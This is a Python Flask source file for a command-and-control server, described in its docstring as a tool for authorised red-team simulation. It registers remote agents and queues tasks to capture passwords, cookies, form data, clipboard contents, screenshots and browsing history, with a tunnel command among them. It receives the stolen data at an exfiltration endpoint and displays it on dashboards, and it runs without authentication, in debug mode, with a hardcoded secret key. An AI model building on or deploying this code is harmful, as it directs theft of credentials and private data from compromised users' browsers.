#!/usr/bin/env python3
"""
Flask-based C2 server for authorized Red Team simulation with a dark-themed dashboard.
"""

import uuid
import json
import click
import sqlite3
from datetime import datetime, timedelta
from flask import (
    Flask, request, jsonify,
    render_template, redirect, url_for,
    flash, Markup
)
from flask_cors import CORS
from typing import Dict
from urllib.parse import urlparse

app = Flask(__name__)
app.secret_key = 'replace_with_secure_key'
CORS(app)

DATABASE = 'c2_server.db'

# Add template mapping
TEMPLATE_MAP: Dict[str, str] = {
    'BOOKMARKS': 'view_bookmarks.html',
    'HISTORY': 'view_history.html',
    'DOWNLOADS': 'view_downloads.html',
    'PASSWORDS': 'view_passwords.html',
    'LOCALSTORAGEDATA': 'view_storage.html',
    'TAKE_SCREENSHOT': 'view_screenshots.html',
    'COOKIES': 'view_cookies.html',
    'FORMS': 'view_forms.html',

    'DOMSNAPSHOT': 'view_snapshots.html',
    'CLIPBOARDCAPTURE': 'view_clipboard.html',
    'ENUMERATION': 'view_enumeration.html',
    'LOCALSTORAGEDUMP': 'view_storage.html'
}

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

#
# 1. Dashboard Routes
#

@app.route('/')
def index():
    """Overview page: stats and recent exfil data."""
    conn = get_db_connection()
    c = conn.cursor()

    # Example stats
    c.execute("SELECT COUNT(*) AS count FROM agents WHERE status='online'")
    active_agents = c.fetchone()['count']

    c.execute("SELECT COUNT(*) AS count FROM tasks WHERE status='pending'")
    pending_tasks = c.fetchone()['count']

    c.execute("SELECT * FROM data_records ORDER BY data_id DESC LIMIT 5")
    recent_data = c.fetchall()

    conn.close()

    return render_template(
        'index.html',
        active_agents=active_agents,
        pending_tasks=pending_tasks,
        recent_data=recent_data
    )

@app.route('/agents')
def agents():
    """Displays the agent management page."""
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get agents with their completed tasks count
    c.execute('''
        SELECT a.*, COUNT(CASE WHEN t.status = 'completed' THEN 1 END) as completed_tasks
        FROM agents a
        LEFT JOIN tasks t ON a.agent_id = t.agent_id
        GROUP BY a.agent_id
    ''')
    
    agents = c.fetchall()
    conn.close()
    
    return render_template('agents.html', agents=agents)

@app.route('/agent/<agent_id>')
def agent_detail(agent_id):
    """Detailed view for a specific agent."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM agents WHERE agent_id = ?", (agent_id,))
    agent = c.fetchone()
    if not agent:
        conn.close()
        flash("Agent not found.")
        return redirect(url_for('agents'))

    # Fetch tasks
    c.execute("SELECT * FROM tasks WHERE agent_id = ?", (agent_id,))
    tasks = c.fetchall()
    conn.close()

    # Safely parse last_seen from string to datetime
    last_seen_str = agent['last_seen']
    last_seen_dt = None
    if last_seen_str:
        try:
            # Adjust format if your DB date format differs
            last_seen_dt = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
        except ValueError:
            # If parsing fails, fallback
            last_seen_dt = datetime.now()
    else:
        # If no last_seen in DB, fallback
        last_seen_dt = datetime.now()

    agent_data = {
        'agent_id': agent['agent_id'],
        'hostname': agent['hostname'] or 'Unknown Host',
        'status': agent['status'],
        'last_seen': last_seen_dt,  # real datetime object now
        'tasks': [{
            'task_id': t['task_id'],
            'description': t['description'] or 'No Description',
            'command': t['command'],
            'parameters': t['parameters'],
            'status': t['status'],
            'assigned_at': t['assigned_at']
        } for t in tasks]
    }

    return render_template('agent_detail.html', agent=agent_data)

@app.route('/tasks')
def tasks():
    """Displays the task management page."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM tasks ORDER BY task_id DESC")
    rows = c.fetchall()
    conn.close()

    tasks_data = []
    for r in rows:
        tasks_data.append({
            'task_id': r['task_id'],
            'agent_id': r['agent_id'],
            'description': r['description'] or 'No Description',
            'command': r['command'],
            'parameters': r['parameters'],
            'status': r['status']
        })
    return render_template('tasks.html', tasks=tasks_data)

@app.route('/data')
def data():
    """Display all data grouped by agent."""
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get all records with timestamp
    c.execute("""
        SELECT dr.*, a.hostname 
        FROM data_records dr 
        LEFT JOIN agents a ON dr.agent_id = a.agent_id 
        ORDER BY dr.data_id DESC
    """)
    records = c.fetchall()
    conn.close()

    # Group records by agent
    group_by_agent = {}
    for record in records:
        agent_id = record['agent_id']
        if agent_id not in group_by_agent:
            group_by_agent[agent_id] = []
        # Convert record to dict and ensure timestamp exists
        record_dict = dict(record)
        if 'created_at' not in record_dict:
            record_dict['created_at'] = record_dict.get('data_id', 'Unknown')
        group_by_agent[agent_id].append(record_dict)

    return render_template('data.html', group_by_agent=group_by_agent)

@app.route('/config')
def config():
    """Placeholder for any settings."""
    return "<h1>Configuration Page (Placeholder)</h1>"

@app.route('/create_task', methods=['GET', 'POST'])
def create_task():
    """Create a new task for a specified agent."""
    conn = get_db_connection()
    c = conn.cursor()

    if request.method == 'POST':
        description = request.form.get('description')
        command = request.form.get('command')
        agent_id = request.form.get('agent_id')
        parameters = request.form.get('parameters')

        if not description or not command or not agent_id:
            flash("Please fill out all required fields.")
            return redirect(url_for('create_task'))

        # For tunnel commands, validate URL
        if command.upper() == 'TUNNEL':
            try:
                params = json.loads(parameters)
                if 'url' not in params:
                    flash("Tunnel command requires a URL in parameters")
                    return redirect(url_for('create_task'))
            except json.JSONDecodeError:
                flash("Invalid JSON parameters for tunnel command")
                return redirect(url_for('create_task'))

        c.execute(
            """INSERT INTO tasks (agent_id, description, command, parameters)
               VALUES (?, ?, ?, ?)""",
            (agent_id, description, command.upper(), parameters)
        )
        conn.commit()
        conn.close()

        return redirect(url_for('tasks'))

    # For GET request, gather agent info
    c.execute("SELECT agent_id, hostname FROM agents")
    agents_rows = c.fetchall()
    conn.close()

    agents_list = []
    for a in agents_rows:
        agents_list.append({
            'agent_id': a['agent_id'],
            'hostname': a['hostname'] or 'Unknown Host'
        })

    return render_template('create_task.html', agents=agents_list)

@app.route('/agent/<agent_id>/data')
def agent_data(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get agent info
    c.execute("SELECT * FROM agents WHERE agent_id = ?", (agent_id,))
    agent = c.fetchone()
    
    # Get all records for this agent using created_at instead of timestamp
    c.execute("""
        SELECT * FROM data_records 
        WHERE agent_id = ? 
        ORDER BY created_at DESC
    """, (agent_id,))
    records = c.fetchall()
    
    # Group records by data type
    data_by_type = {}
    for record in records:
        data_type = record['data_type'].lower()
        if data_type not in data_by_type:
            data_by_type[data_type] = []
        
        # Parse JSON payload if exists
        try:
            payload = json.loads(record['payload']) if record['payload'] else None
        except json.JSONDecodeError:
            payload = record['payload']
            
        record_dict = dict(record)
        record_dict['payload'] = payload
        data_by_type[data_type].append(record_dict)
    
    conn.close()
    
    return render_template('agent_data.html', 
                         agent=agent,
                         agent_id=agent_id,
                         data_by_type=data_by_type)

@app.route('/agent/<agent_id>/data/<data_type>')
def view_data_type(agent_id, data_type):
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get collection period
    c.execute("""
        SELECT MIN(created_at), MAX(created_at)
        FROM data_records 
        WHERE agent_id = ? AND data_type = ?
    """, (agent_id, data_type))
    date_range = c.fetchone()
    
    # Get all records
    c.execute("""
        SELECT data_id, agent_id, data_type, payload, created_at 
        FROM data_records 
        WHERE agent_id = ? AND data_type = ?
        ORDER BY created_at DESC
    """, (agent_id, data_type))
    
    records = c.fetchall()
    data_type = data_type.upper()
    
    try:
        formatted_records = []
        total_entries = 0
        unique_domains = set()
        domain_frequency = {}

        for record in records:
            try:
                payload = json.loads(record[3]) if record[3] else {}
                
                # Process entries and count statistics
                if 'entries' in payload:
                    total_entries += len(payload['entries'])
                    # Extract domains from URLs
                    for entry in payload['entries']:
                        if 'url' in entry:
                            try:
                                domain = urlparse(entry['url']).netloc
                                unique_domains.add(domain)
                                domain_frequency[domain] = domain_frequency.get(domain, 0) + 1
                            except:
                                continue

                formatted_record = {
                    'data_id': record[0],
                    'agent_id': record[1],
                    'data_type': record[2],
                    'payload': payload,
                    'created_at': record[4]
                }
                formatted_records.append(formatted_record)
            except json.JSONDecodeError:
                continue

        # Calculate collection period
        start_date = datetime.strptime(date_range[0], '%Y-%m-%d %H:%M:%S') if date_range[0] else None
        end_date = datetime.strptime(date_range[1], '%Y-%m-%d %H:%M:%S') if date_range[1] else None
        collection_period = (end_date - start_date).days + 1 if start_date and end_date else 0

        # Get top domains by frequency
        top_domains = sorted(domain_frequency.items(), key=lambda x: x[1], reverse=True)[:5]

        template = TEMPLATE_MAP.get(data_type, 'view_generic.html')
        
        # Prepare the data for JavaScript
        history_data_json = json.dumps(formatted_records, default=str)
        
        # Ensure safe JSON encoding
        try:
            history_data_json = json.dumps(formatted_records, default=str)
        except Exception as e:
            print(f"JSON encoding error: {e}")
            history_data_json = "[]"
        
        stats = {
            'total_entries': total_entries,
            'unique_domains': len(unique_domains),
            'collection_period': collection_period,
            'start_date': start_date,
            'end_date': end_date,
            'frequent_sites': len([d for d in domain_frequency.values() if d > 5])
        }

        return render_template(
            template,
            agent_id=agent_id,
            records=formatted_records,
            history_data_json=Markup(history_data_json),
            data_type=data_type,
            stats=stats
        )
    except Exception as e:
        print(f"Error processing {data_type} data: {e}")
        return render_template('error.html', 
                             error=f"Error processing {data_type} data",
                             details=str(e))
    finally:
        conn.close()

@app.route('/agent/<agent_id>/data/BOOKMARKS')
def view_bookmarks(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    # Get all bookmark records for this agent, ordered by most recent first
    c.execute("""
        SELECT 
            data_id,
            agent_id,
            created_at,
            payload
        FROM data_records 
        WHERE agent_id = ? 
        AND data_type = 'BOOKMARKS'
        ORDER BY created_at DESC
    """, (agent_id,))
    
    records = []
    for record in c.fetchall():
        try:
            record_dict = dict(record)
            # Parse JSON payload
            record_dict['payload'] = json.loads(record_dict['payload'])
            records.append(record_dict)
        except json.JSONDecodeError as e:
            flash(f'Error parsing bookmark data: {str(e)}', 'error')
            continue
    
    conn.close()
    return render_template('view_bookmarks.html', agent_id=agent_id, records=records)

@app.route('/agent/<agent_id>/enumeration')
def view_enumeration(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        # Get all enumeration records for this agent
        c.execute("""
            SELECT data_id, agent_id, data_type, payload, created_at 
            FROM data_records 
            WHERE agent_id = ? AND data_type = 'ENUMERATION'
            ORDER BY created_at DESC
        """, (agent_id,))
        
        # Convert to dict for easier template handling
        records = []
        for row in c.fetchall():
            try:
                # Parse the JSON payload if it's a string
                payload = row[3]
                if isinstance(payload, str):
                    payload = json.loads(payload)
                
                records.append({
                    'data_id': row[0],
                    'agent_id': row[1],
                    'data_type': row[2],
                    'payload': payload,
                    'created_at': row[4]
                })
            except json.JSONDecodeError as e:
                print(f"Error decoding JSON for record {row[0]}: {e}")
                continue
        
        return render_template('view_enumeration.html', 
                             agent_id=agent_id,
                             records=records)
    except Exception as e:
        flash(f"Error retrieving enumeration data: {e}", 'error')
        return redirect(url_for('agent_data', agent_id=agent_id))
    finally:
        conn.close()

@app.route('/agent/<agent_id>/cookies')
def view_cookies(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        c.execute("""
            SELECT data_id, agent_id, data_type, payload, created_at 
            FROM data_records 
            WHERE agent_id = ? AND data_type = 'COOKIES'
            ORDER BY created_at DESC
        """, (agent_id,))
        
        # Convert to dict for easier template handling
        records = []
        for row in c.fetchall():
            try:
                # Parse the JSON payload
                payload = row[3]
                if isinstance(payload, str):
                    cookies_data = json.loads(payload)
                else:
                    cookies_data = payload

                records.append({
                    'data_id': row[0],
                    'agent_id': row[1],
                    'data_type': row[2],
                    'payload': cookies_data,
                    'created_at': row[4]
                })
            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
                print(f"Raw payload: {row[3]}")
                return render_template('error.html',
                                    error="Error processing cookie data",
                                    details=str(e))
            
        return render_template('view_cookies.html',
                            agent_id=agent_id,
                            records=records)
    except Exception as e:
        print(f"Database error: {e}")
        return render_template('error.html',
                             error="Database error",
                             details=str(e))
    finally:
        conn.close()

#
# 2. API Routes
#

@app.route('/api/register', methods=['POST'])
def register_agent():
    """Register a new agent."""
    data = request.json or {}
    hostname = data.get('agent_name', 'RedExtAgent')
    agent_id = str(uuid.uuid4())

    conn = get_db_connection()
    c = conn.cursor()
    c.execute(
        """INSERT INTO agents (agent_id, hostname, status, last_seen)
           VALUES (?, ?, 'online', datetime('now'))""",
        (agent_id, hostname)
    )
    conn.commit()
    conn.close()

    return jsonify({'status': 'registered', 'agent_id': agent_id})

@app.route('/api/commands')
def get_commands():
    """Agents poll this endpoint for new commands."""
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'error': 'missing agent_id'}), 400

    conn = get_db_connection()
    c = conn.cursor()
    
    # Only get tasks that are in 'pending' status
    c.execute("""SELECT * FROM tasks 
                 WHERE agent_id = ? 
                 AND status = 'pending'""", (agent_id,))
    tasks = c.fetchall()

    commands = []
    for task in tasks:
        payload = {}
        if task['parameters']:
            try:
                payload = json.loads(task['parameters'])
            except json.JSONDecodeError:
                payload = {}
        commands.append({'type': task['command'].lower(), 'payload': payload})

        # Mark task as 'in_progress' immediately
        c.execute("""UPDATE tasks
                     SET status = 'in_progress'
                     WHERE task_id = ?""",
                  (task['task_id'],))

    conn.commit()
    conn.close()

    return jsonify(commands)

@app.route('/api/exfil', methods=['POST'])
def exfil():
    """Handle exfiltrated data from agents."""
    data = request.get_json()
    agent_id = data.get('agent_id')
    action = data.get('action', '').upper()
    payload = data.get('payload')

    if not agent_id or not action:
        return jsonify({'status': 'error', 'message': 'Missing required fields'})

    conn = get_db_connection()
    c = conn.cursor()
    
    try:
        # Store the exfiltrated data
        c.execute("""
            INSERT INTO data_records (agent_id, data_type, payload)
            VALUES (?, ?, ?)
        """, (agent_id, action, json.dumps(payload)))

        # Find latest matching task
        c.execute("""
            SELECT task_id FROM tasks
            WHERE agent_id = ?
            AND command = ?
            AND status IN ('pending', 'in_progress')
            ORDER BY task_id DESC 
            LIMIT 1
        """, (agent_id, action))
                
        row = c.fetchone()
        if row:
            task_id = row['task_id']
            c.execute("""
                UPDATE tasks
                SET status = 'completed'
                WHERE task_id = ?
            """, (task_id,))

        conn.commit()
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error handling exfil: {e}")
        return jsonify({'status': 'error', 'message': str(e)})
    finally:
        conn.close()

@app.route('/api/tasks/delete/<int:task_id>', methods=['POST'])
def delete_task(task_id):
    """Delete a task from the database."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("DELETE FROM tasks WHERE task_id = ?", (task_id,))
    success = c.rowcount > 0
    conn.commit()
    conn.close()
    return jsonify({'success': success})

@app.route('/api/tasks/bulk', methods=['POST'])
def bulk_task_action():
    data = request.json
    action = data.get('action')
    task_ids = data.get('taskIds', [])
    
    if action == 'cancel':
        success = cancel_tasks(task_ids)
    elif action == 'delete':
        success = delete_tasks(task_ids)
    else:
        return jsonify({'success': False, 'error': 'Invalid action'})
    
    return jsonify({'success': success})

def get_task_by_id(task_id):
    """Get task details from database."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM tasks WHERE task_id = ?", (task_id,))
    task = c.fetchone()
    conn.close()
    return task

def cancel_task_by_id(task_id):
    """Cancel a single task."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE tasks SET status = 'cancelled' WHERE task_id = ?", (task_id,))
    success = c.rowcount > 0
    conn.commit()
    conn.close()
    return success

def cancel_tasks(task_ids):
    """Cancel multiple tasks."""
    conn = get_db_connection()
    c = conn.cursor()
    placeholders = ','.join('?' * len(task_ids))
    c.execute(f"UPDATE tasks SET status = 'cancelled' WHERE task_id IN ({placeholders})", task_ids)
    success = c.rowcount > 0
    conn.commit()
    conn.close()
    return success

def delete_tasks(task_ids):
    """Delete multiple tasks."""
    conn = get_db_connection()
    c = conn.cursor()
    placeholders = ','.join('?' * len(task_ids))
    c.execute(f"DELETE FROM tasks WHERE task_id IN ({placeholders})", task_ids)
    success = c.rowcount > 0
    conn.commit()
    conn.close()
    return success

@app.route('/api/agents/<agent_id>/status', methods=['GET'])
def get_agent_status(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('SELECT last_seen FROM agents WHERE agent_id = ?', (agent_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        return jsonify({'error': 'Agent not found'}), 404
        
    last_seen = result['last_seen']
    
    # Calculate status based on last_seen
    if not last_seen:
        status = 'offline'
    else:
        last_seen_dt = datetime.strptime(last_seen, '%Y-%m-%d %H:%M:%S')
        time_diff = datetime.now() - last_seen_dt
        
        if time_diff.total_seconds() < 300:  # 5 minutes
            status = 'online'
        elif time_diff.total_seconds() < 900:  # 15 minutes
            status = 'idle'
        else:
            status = 'offline'
    
    return jsonify({
        'status': status,
        'last_seen': last_seen
    })

@app.route('/api/agents/<agent_id>', methods=['DELETE'])
def delete_agent(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    
    # Delete related tasks first
    c.execute('DELETE FROM tasks WHERE agent_id = ?', (agent_id,))
    
    # Delete agent
    c.execute('DELETE FROM agents WHERE agent_id = ?', (agent_id,))
    success = c.rowcount > 0
    
    conn.commit()
    conn.close()
    
    if not success:
        return jsonify({'error': 'Agent not found'}), 404
        
    return '', 204

#
# 3. CLI Commands
#

@click.group()
def cli():
    """C2 Server CLI."""
    pass

@cli.command()
def runserver():
    """Run the Flask server."""
    app.run(host='0.0.0.0', port=5000, debug=True)

@cli.command()
def list_agents():
    """List all agents."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM agents")
    rows = c.fetchall()
    conn.close()

    if not rows:
        click.echo("No agents registered.")
        return

    for r in rows:
        click.echo(
            f"ID: {r['agent_id']} | Hostname: {r['hostname']} "
            f"| Status: {r['status']} | Last Seen: {r['last_seen']}"
        )

@cli.command()
@click.argument('agent_id')
@click.argument('command')
@click.option('--desc', default='No Description', help='Task description.')
@click.option('--params', default='', help='JSON string for parameters.')
def assign_task(agent_id, command, desc, params):
    """Assign a task to an agent."""
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT * FROM agents WHERE agent_id = ?", (agent_id,))
    agent_row = c.fetchone()
    if not agent_row:
        click.echo("Invalid agent_id.")
        conn.close()
        return

    c.execute("""INSERT INTO tasks (agent_id, description, command, parameters)
                 VALUES (?, ?, ?, ?)""",
              (agent_id, desc, command.upper(), params))
    conn.commit()
    conn.close()

    click.echo(f"Assigned '{command}' to agent {agent_id} with desc='{desc}' params='{params}'")

@cli.command()
@click.argument('agent_id')
def show_data(agent_id):
    """Show exfil data for an agent."""
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("SELECT * FROM data_records WHERE agent_id = ? ORDER BY data_id DESC", (agent_id,))
    rows = c.fetchall()
    conn.close()

    if not rows:
        click.echo("No data for this agent.")
        return

    for i, r in enumerate(rows, 1):
        click.echo(f"[{i}] Action: {r['data_type']}  Time: {r['timestamp']}")
        try:
            p = json.loads(r['payload'])
            click.echo(json.dumps(p, indent=2))
        except json.JSONDecodeError:
            click.echo(r['payload'])
        click.echo("-" * 40)

@app.template_filter('from_json')
def from_json(value):
    try:
        if isinstance(value, str):
            return json.loads(value)
        return value
    except Exception as e:
        print(f"Error parsing JSON: {e}")
        return {}

@app.template_filter('format_datetime')
def format_datetime(value):
    try:
        if isinstance(value, str):
            dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        else:
            dt = datetime.fromtimestamp(value)
        return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
    except Exception as e:
        print(f"Error formatting datetime: {e}")
        return value

@app.template_filter('calculate_status')
def calculate_status(last_seen):
    if not last_seen:
        return 'offline'
        
    try:
        if isinstance(last_seen, str):
            last_seen = datetime.strptime(last_seen, '%Y-%m-%d %H:%M:%S')
            
        time_diff = datetime.now() - last_seen
        
        # More than 24 hours - offline
        if time_diff > timedelta(hours=24):
            return 'offline'
        # Between 12 and 24 hours - idle
        elif time_diff > timedelta(hours=12):
            return 'idle'
        # Less than 12 hours - online
        else:
            return 'online'
    except Exception as e:
        print(f"Error calculating status: {e}")
        return 'offline'

# Register the filter with Jinja2
app.jinja_env.filters['calculate_status'] = calculate_status

@app.route('/api/tasks/<task_id>')
def get_task_details(task_id):
    # Return task details as JSON
    task = get_task_by_id(task_id)
    return jsonify(task)

@app.route('/api/tasks/<task_id>/cancel', methods=['POST'])
def cancel_task(task_id):
    # Cancel the task
    success = cancel_task_by_id(task_id)
    return jsonify({'success': success})

@app.template_filter('extract_domain')
def extract_domain(url):
    try:
        from urllib.parse import urlparse
        return urlparse(url).netloc
    except:
        return url

@app.template_filter('format_timestamp')
def format_timestamp(value):
    try:
        if isinstance(value, str):
            dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
        elif isinstance(value, (int, float)):
            dt = datetime.fromtimestamp(value)
        else:
            return str(value)
        return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
    except Exception as e:
        print(f"Error formatting timestamp: {e}")
        return str(value)

# Add to existing filters
app.jinja_env.filters['format_timestamp'] = format_timestamp

def timestamp_to_date(timestamp_ms, format='%d-%m-%Y'):
    """Convert timestamp to formatted date string"""
    try:
        # Convert milliseconds to seconds if necessary
        timestamp_sec = timestamp_ms / 1000 if timestamp_ms > 1e10 else timestamp_ms
        return datetime.fromtimestamp(timestamp_sec).strftime(format)
    except (ValueError, TypeError):
        return 'Invalid Date'

def format_datetime(value, format='%d-%m-%Y'):
    """Format datetime string to desired format"""
    try:
        if isinstance(value, (int, float)):
            return timestamp_to_date(value, format)
        elif isinstance(value, str):
            # Try parsing the string as datetime
            dt = datetime.fromisoformat(value.replace('Z', '+00:00'))
            return dt.strftime(format)
        elif isinstance(value, datetime):
            return value.strftime(format)
        return str(value)
    except (ValueError, TypeError):
        return 'Invalid Date'

# Add these filters to your Flask app
app.jinja_env.filters['timestamp_to_date'] = timestamp_to_date
app.jinja_env.filters['format_datetime'] = format_datetime

def process_cookie_data(record):
    """Process and format cookie data."""
    try:
        if isinstance(record['payload'], dict):
            # Ensure cookies is a list
            if 'cookies' in record['payload']:
                if isinstance(record['payload']['cookies'], dict):
                    record['payload']['cookies'] = [
                        {'name': k, 'value': v} for k, v in record['payload']['cookies'].items()
                    ]
            else:
                record['payload']['cookies'] = []
    except Exception as e:
        print(f"Error processing cookie data: {e}")
        record['payload'] = {'cookies': [], 'domain': 'unknown'}
    return record

def process_history_data(record):
    """Process and format history data."""
    try:
        if isinstance(record['payload'], dict):
            if not isinstance(record['payload'].get('history', []), list):
                record['payload']['history'] = []
    except Exception as e:
        print(f"Error processing history data: {e}")
        record['payload'] = {'history': []}
    return record

def process_bookmark_data(record):
    """Process and format bookmark data."""
    try:
        if isinstance(record['payload'], dict):
            if not isinstance(record['payload'].get('bookmarks', []), list):
                record['payload']['bookmarks'] = []
    except Exception as e:
        print(f"Error processing bookmark data: {e}")
        record['payload'] = {'bookmarks': []}
    return record

@app.template_global()
def now():
    return datetime.utcnow()

if __name__ == '__main__':
    cli()
